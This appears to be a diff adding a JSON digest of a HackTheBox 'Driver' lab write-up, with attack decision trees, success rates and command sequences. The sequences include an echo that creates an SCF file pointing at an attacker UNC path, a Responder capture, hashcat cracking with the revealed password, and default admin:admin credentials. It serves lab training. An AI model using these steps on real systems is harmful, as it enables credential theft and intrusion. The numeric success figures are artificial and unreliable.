@@ -1,0 +1,848 @@
+{
+  "writeup_id": "Htb_Driver",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_printer_scf_file_attack",
+    "primary_services": [
+      "http",
+      "smb",
+      "winrm",
+      "msrpc"
+    ],
+    "port_signature": "80+135+445+5985",
+    "service_combination": "http+smb+winrm+msrpc",
+    "os_family": "windows_10_server2016",
+    "environment_type": "printer_management_system",
+    "entry_vector": "scf_file_upload_ntlm_capture",
+    "privilege_path": "file_upload_to_system",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "mfp_firmware_update_center",
+      "file_upload_functionality",
+      "default_admin_credentials",
+      "smb_file_share_backend"
+    ],
+    "environmental_clues": [
+      "basic_auth_with_admin_username_hint",
+      "php_on_iis_stack",
+      "printer_management_interface",
+      "file_upload_to_share_mechanism"
+    ],
+    "similar_scenarios": [
+      "return_htb_easy",
+      "forest_htb_easy"
+    ],
+    "unique_aspects": [
+      "printer_driver_exploitation_path",
+      "printnightmare_vulnerability",
+      "scf_file_ntlm_relay_attack",
+      "ricoh_printer_driver_exploit"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SCF_File_Upload_Attack",
+        "success_reason": "File upload functionality allowed SCF files that triggered automatic SMB authentication when viewed",
+        "prerequisite_indicators": [
+          "file_upload_functionality_exists",
+          "uploads_stored_on_smb_share",
+          "users_browse_uploaded_files",
+          "smb_accessible_from_target"
+        ],
+        "recognition_patterns": [
+          "printer/MFP web interfaces",
+          "firmware update portals",
+          "file upload forms without extension filtering",
+          "SMB shares accessible via web uploads"
+        ],
+        "failure_modes": [
+          "scf_files_blocked_by_extension_filter",
+          "uploads_not_stored_on_smb_share",
+          "no_users_browse_upload_directory",
+          "smb_authentication_disabled"
+        ],
+        "environmental_factors": [
+          "windows_smb_environment",
+          "users_with_file_browsing_habits",
+          "printer_management_workflows",
+          "insufficient_upload_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Default_Credential_Authentication",
+        "success_reason": "Admin interface used default credentials admin:admin",
+        "prerequisite_indicators": [
+          "basic_auth_prompt_present",
+          "admin_username_disclosed_in_realm",
+          "printer_or_appliance_interface",
+          "no_password_policy_enforcement"
+        ],
+        "recognition_patterns": [
+          "WWW-Authenticate header reveals username",
+          "MFP/printer web interfaces",
+          "basic auth realm mentions admin",
+          "appliance management portals"
+        ],
+        "failure_modes": [
+          "default_credentials_changed",
+          "account_lockout_enabled",
+          "strong_password_policy",
+          "multi_factor_authentication"
+        ],
+        "environmental_factors": [
+          "default_appliance_configuration",
+          "insufficient_security_hardening",
+          "printer_management_neglect",
+          "legacy_device_management"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "SMB_Hash_Capture_and_Crack",
+        "success_reason": "User browsed SCF file triggering NTLMv2 hash capture, weak password cracked quickly",
+        "prerequisite_indicators": [
+          "responder_or_impacket_available",
+          "smb_authentication_occurs",
+          "weak_password_policies",
+          "hashcat_wordlists_available"
+        ],
+        "recognition_patterns": [
+          "NTLMv2 hashes captured in responder",
+          "service account naming patterns",
+          "quick hash cracking success",
+          "common password patterns"
+        ],
+        "failure_modes": [
+          "strong_password_policy",
+          "no_smb_authentication_triggered",
+          "hash_cracking_unsuccessful",
+          "smb_signing_required"
+        ],
+        "environmental_factors": [
+          "weak_password_culture",
+          "insufficient_password_complexity",
+          "legacy_authentication_methods",
+          "user_behavior_patterns"
+        ],
+        "success_probability": 0.7,
+        "typical_timeframe": "15-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "File upload functionality on printer interface",
+        "discovery_method": "Web application enumeration",
+        "why_critical": "Enabled SCF file attack leading to credential capture",
+        "how_to_recognize": [
+          "firmware update portals",
+          "file upload forms on appliances",
+          "printer management interfaces",
+          "MFP web consoles"
+        ],
+        "follow_up_actions": [
+          "test_scf_file_upload",
+          "setup_responder_listener",
+          "monitor_for_smb_authentication",
+          "prepare_hash_cracking_tools"
+        ]
+      },
+      {
+        "discovery": "Default admin credentials",
+        "discovery_method": "Basic authentication testing",
+        "why_critical": "Provided initial access to upload functionality",
+        "how_to_recognize": [
+          "basic auth realm reveals username",
+          "appliance default credential patterns",
+          "printer interface authentication",
+          "admin:admin common default"
+        ],
+        "follow_up_actions": [
+          "enumerate_upload_functionality",
+          "test_file_upload_restrictions",
+          "identify_backend_storage_location",
+          "map_user_access_patterns"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "captured_user_credentials",
+        "escalation_method": "WinRM_Access",
+        "why_possible": "Captured user credentials valid for WinRM authentication",
+        "recognition_signs": [
+          "port_5985_open_winrm",
+          "user_in_remote_management_group",
+          "valid_domain_credentials",
+          "windows_remote_management_enabled"
+        ],
+        "exploitation_path": "SCF Upload → SMB Auth → Hash Crack → WinRM Shell"
+      },
+      {
+        "privilege_level": "user_shell_access",
+        "escalation_method": "PrintNightmare_or_Driver_Exploit",
+        "why_possible": "Windows print spooler vulnerabilities available for privilege escalation",
+        "recognition_signs": [
+          "print_spooler_service_running",
+          "vulnerable_printer_drivers",
+          "printnightmare_conditions_met",
+          "insufficient_print_security_hardening"
+        ],
+        "exploitation_path": "User Shell → Print Spooler Exploit → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80,135,445,5985 open on Windows host",
+        "decision": "Enumerate web service first due to basic auth prompt",
+        "reasoning": "HTTP basic auth often uses weak credentials, WinRM available for shell if creds found",
+        "confidence": 0.8,
+        "alternatives": [
+          {
+            "option": "smb_enumeration",
+            "when": "if web auth fails"
+          },
+          {
+            "option": "winrm_bruteforce",
+            "when": "if credentials discovered"
+          }
+        ],
+        "success_indicators": [
+          "basic_auth_bypassed",
+          "file_upload_functionality_found",
+          "smb_share_access_mentioned"
+        ],
+        "next_decision": "analyze_upload_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found file upload to SMB share functionality",
+        "decision": "Deploy SCF file attack for Net-NTLMv2 capture",
+        "reasoning": "File uploads to SMB shares allow SCF poisoning attacks when viewed in Explorer",
+        "confidence": 0.9,
+        "prerequisites": [
+          "file_upload_access",
+          "smb_share_backend_confirmed"
+        ],
+        "success_indicators": [
+          "ntlmv2_hash_captured",
+          "responder_authentication_received"
+        ],
+        "failure_fallbacks": [
+          "lnk_file_attack",
+          "direct_webshell_upload",
+          "smb_relay_attack"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Captured Net-NTLMv2 hash from SCF attack",
+        "decision": "Crack hash with hashcat and test WinRM access",
+        "reasoning": "WinRM port open, cracked credentials likely provide remote shell access",
+        "confidence": 0.85,
+        "prerequisites": [
+          "ntlmv2_hash_captured",
+          "winrm_port_accessible"
+        ],
+        "success_indicators": [
+          "password_cracked",
+          "winrm_authentication_successful"
+        ],
+        "failure_fallbacks": [
+          "smb_access_attempt",
+          "password_spraying_other_services"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_scf_attack_succeeds": {
+        "action": "crack_ntlmv2_and_authenticate",
+        "tools": [
+          "hashcat",
+          "evil-winrm"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_scf_attack_fails": {
+        "action": "try_alternative_file_attacks",
+        "alternatives": [
+          "lnk_poisoning",
+          "webshell_upload",
+          "smb_relay"
+        ],
+        "decision_criteria": "based_on_upload_restrictions_and_file_processing"
+      },
+      "if_credentials_obtained": {
+        "action": "enumerate_privilege_escalation",
+        "purpose": "find_local_privilege_escalation_vectors",
+        "tools": [
+          "winpeas",
+          "powerup",
+          "driver_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_try_scf_poisoning_on_smb_file_uploads",
+        "reasoning": "high_success_rate_when_files_viewed_in_explorer",
+        "applicability": "file_upload_to_smb_share_functionality"
+      },
+      {
+        "rule": "prioritize_winrm_over_smb_for_shell_access",
+        "reasoning": "cleaner_shell_and_better_functionality",
+        "applicability": "both_winrm_and_smb_accessible_with_creds"
+      },
+      {
+        "rule": "enumerate_printer_drivers_on_printer_themed_boxes",
+        "reasoning": "printer_drivers_often_vulnerable_to_privilege_escalation",
+        "applicability": "printer_related_services_or_themes_identified"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SCF_File_Attack",
+        "mitre_id": "T1187",
+        "required_services": [
+          "smb",
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "smb_share_accessible",
+          "windows_file_explorer_usage",
+          "network_authentication_enabled"
+        ],
+        "success_indicators": [
+          "file_upload_accepted",
+          "ntlm_hash_captured",
+          "smb_connection_initiated",
+          "responder_receives_auth"
+        ],
+        "incompatible_with": [
+          "file_upload_filtering_scf",
+          "smb_disabled",
+          "network_isolation",
+          "automated_processing_only"
+        ],
+        "confidence_boosters": [
+          "printer_web_interface",
+          "firmware_update_portal",
+          "shared_folder_mentions",
+          "basic_auth_weak_creds"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "PrintNightmare",
+        "mitre_id": "T1068",
+        "required_services": [
+          "spoolsv"
+        ],
+        "required_ports": [
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "print_spooler_service_running",
+          "windows_server_2016_2019_or_win10",
+          "authenticated_access_available",
+          "rpc_accessible"
+        ],
+        "success_indicators": [
+          "spooler_service_responsive",
+          "driver_installation_possible",
+          "system_privileges_gained"
+        ],
+        "incompatible_with": [
+          "print_spooler_disabled",
+          "patches_applied",
+          "restricted_driver_installation"
+        ],
+        "confidence_boosters": [
+          "printer_related_services",
+          "unpatched_system",
+          "default_configurations"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "WinRM_Password_Spray",
+        "mitre_id": "T1110.003",
+        "required_services": [
+          "winrm"
+        ],
+        "required_ports": [
+          5985,
+          5986
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "winrm_service_enabled",
+          "valid_credentials_obtained",
+          "remote_management_users_exist"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "powershell_session_established",
+          "command_execution_possible"
+        ],
+        "incompatible_with": [
+          "winrm_disabled",
+          "certificate_auth_only",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "captured_credentials_available",
+          "default_admin_accounts",
+          "weak_password_policies"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Basic_Auth_Bruteforce",
+        "mitre_id": "T1110.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "basic_authentication_enabled",
+          "weak_credentials_likely",
+          "no_account_lockout"
+        ],
+        "success_indicators": [
+          "200_response_received",
+          "authentication_successful",
+          "protected_content_accessible"
+        ],
+        "incompatible_with": [
+          "account_lockout_enabled",
+          "rate_limiting_active",
+          "strong_password_policy"
+        ],
+        "confidence_boosters": [
+          "default_admin_username",
+          "printer_web_interface",
+          "firmware_update_portal"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_smb": {
+        "port_indicators": [
+          135,
+          445
+        ],
+        "service_indicators": [
+          "microsoft-ds",
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Microsoft Windows",
+          "SMB"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "printer_web_interface": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "MFP",
+          "Firmware Update",
+          "printer"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "winrm_enabled": {
+        "port_indicators": [
+          5985,
+          5986
+        ],
+        "service_indicators": [
+          "wsman",
+          "winrm"
+        ],
+        "banner_indicators": [
+          "Microsoft HTTPAPI"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "iis_webserver": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "X-Powered-By: PHP"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "basic_auth_bruteforce",
+          "when": "basic_auth_detected_with_username_hint",
+          "reason": "quick_win_often_default_credentials"
+        },
+        {
+          "attack": "scf_file_attack",
+          "when": "file_upload_and_smb_detected",
+          "reason": "high_success_rate_credential_capture"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "winrm_access",
+          "when": "credentials_obtained_and_winrm_open",
+          "reason": "direct_shell_access_reliable"
+        },
+        {
+          "attack": "printnightmare",
+          "when": "windows_system_with_print_services",
+          "reason": "privilege_escalation_opportunity"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SCF File Attack",
+        "mitre_id": "T1187",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "responder",
+            "command_template": "sudo responder -I {interface}",
+            "actual_command": "sudo responder -I tun0",
+            "output_pattern": "[SMB] NTLMv2-SSP Hash     : {username}::{domain}:",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          },
+          {
+            "name": "hashcat",
+            "command_template": "hashcat {hash_file} -m 5600 {wordlist}",
+            "actual_command": "hashcat tony.hash -m 5600 /usr/share/wordlists/rockyou.txt",
+            "success_factors": [
+              "weak_password",
+              "common_wordlist_hit"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "smb_share_access",
+          "windows_file_explorer_usage",
+          "network_connectivity_to_attacker"
+        ],
+        "success_indicators": [
+          "net_ntlmv2_hash_captured",
+          "hash_cracked_successfully",
+          "credentials_provide_system_access"
+        ],
+        "common_failures": [
+          "no_file_explorer_access_to_share",
+          "strong_passwords_resist_cracking",
+          "network_isolation_prevents_callback"
+        ],
+        "follow_up_techniques": [
+          "winrm_authentication",
+          "smb_enumeration",
+          "credential_spraying"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Basic Authentication Bypass",
+        "mitre_id": "T1110.001",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "browser",
+            "command_template": "admin:{common_password}",
+            "actual_command": "admin:admin",
+            "output_pattern": "HTTP/1.1 200 OK",
+            "effectiveness_rating": 3,
+            "reliability": 0.65
+          }
+        ],
+        "prerequisites": [
+          "basic_auth_enabled",
+          "weak_default_credentials",
+          "username_disclosed_in_realm"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "access_to_protected_resources"
+        ],
+        "common_failures": [
+          "strong_password_policy",
+          "account_lockout_mechanisms",
+          "non_default_credentials"
+        ],
+        "follow_up_techniques": [
+          "file_upload_exploitation",
+          "web_application_enumeration"
+        ],
+        "time_investment": "1-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "responder",
+        "use_case": "net_ntlmv2_hash_capture",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_environments",
+          "smb_exploitation"
+        ],
+        "alternatives": [
+          "impacket_smbserver",
+          "metasploit_auxiliary"
+        ],
+        "best_practices": [
+          "run_on_correct_network_interface",
+          "monitor_for_multiple_hash_captures",
+          "save_hashes_immediately_for_cracking"
+        ]
+      },
+      {
+        "tool": "hashcat",
+        "use_case": "net_ntlmv2_hash_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.88,
+        "learning_curve": "medium",
+        "essential_for": [
+          "password_cracking",
+          "credential_recovery"
+        ],
+        "alternatives": [
+          "john_the_ripper",
+          "hashcat_legacy"
+        ],
+        "best_practices": [
+          "use_correct_hash_mode_5600",
+          "start_with_common_wordlists",
+          "consider_rule_based_attacks_for_complex_passwords"
+        ]
+      },
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "ffuf"
+        ],
+        "best_practices": [
+          "include_authentication_headers_when_needed",
+          "use_appropriate_file_extensions",
+          "consider_case_sensitivity_on_windows"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "scf_file_hash_capture_attack",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo '[Shell]\\nCommand=2\\nIconFile=\\\\\\\\10.10.14.6\\\\evil.exe,3' > 0xdf.scf",
+            "purpose": "Create malicious SCF file",
+            "expected_output": "SCF file with UNC path to attacker"
+          },
+          {
+            "step": 2,
+            "command": "sudo responder -I tun0",
+            "purpose": "Start responder to capture authentication",
+            "expected_output": "Multiple servers listening for events"
+          },
+          {
+            "step": 3,
+            "command": "Upload 0xdf.scf via web interface",
+            "purpose": "Deploy SCF file to target share",
+            "expected_output": "File uploaded successfully"
+          },
+          {
+            "step": 4,
+            "command": "hashcat tony.hash -m 5600 /usr/share/wordlists/rockyou.txt",
+            "purpose": "Crack captured Net-NTLMv2 hash",
+            "expected_output": "Password: liltony"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "web_authentication_bypass",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -u admin:admin http://10.10.11.106/",
+            "purpose": "Test default credentials",
+            "expected_output": "HTTP 200 response with web content"
+          },
+          {
+            "step": 2,
+            "command": "feroxbuster -u http://10.10.11.106 -x php -H 'Authorization: Basic YWRtaW46YWRtaW4='",
+            "purpose": "Enumerate authenticated endpoints",
+            "expected_output": "Discovery of fw_up.php upload functionality"
+          }
+        ],
+        "success_rate": 0.7,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Driver",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2021-10-02",
+      "author": "MrR3boot",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "scf_file_attack",
+        "printer_exploitation",
+        "winrm"
+      ],
+      "key_vulnerabilities": [
+        "scf_file_upload",
+        "printnightmare",
+        "ricoh_driver_exploit"
+      ],
+      "environment_type": "printer_management_system",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "scf_attacks",
+        "printer_exploitation",
+        "printnightmare"
+      ],
+      "prerequisite_knowledge": [
+        "basic_windows",
+        "file_share_concepts",
+        "printer_systems"
+      ]
+    },
+    "categorization": {
+      "primary_category": "printer_exploitation",
+      "subcategories": [
+        "scf_attacks",
+        "printnightmare",
+        "driver_exploitation"
+      ],
+      "attack_types": [
+        "credential_access",
+        "privilege_escalation",
+        "file_upload"
+      ],
+      "defensive_lessons": [
+        "secure_file_uploads",
+        "printer_hardening",
+        "patch_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Return",
+        "Antique",
+        "Printer"
+      ],
+      "similarity_reasons": [
+        "printer_theme",
+        "scf_attacks",
+        "windows_exploitation"
+      ],
+      "unique_aspects": [
+        "printer_web_interface",
+        "dual_escalation_paths",
+        "mfp_firmware_center"
+      ],
+      "difficulty_factors": [
+        "straightforward_scf_attack",
+        "multiple_privesc_options",
+        "well_known_exploits"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T16:34:53.482481",
+    "original_file": "0xdf_writeups/Htb Driver.md",
+    "content_length": 35039,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
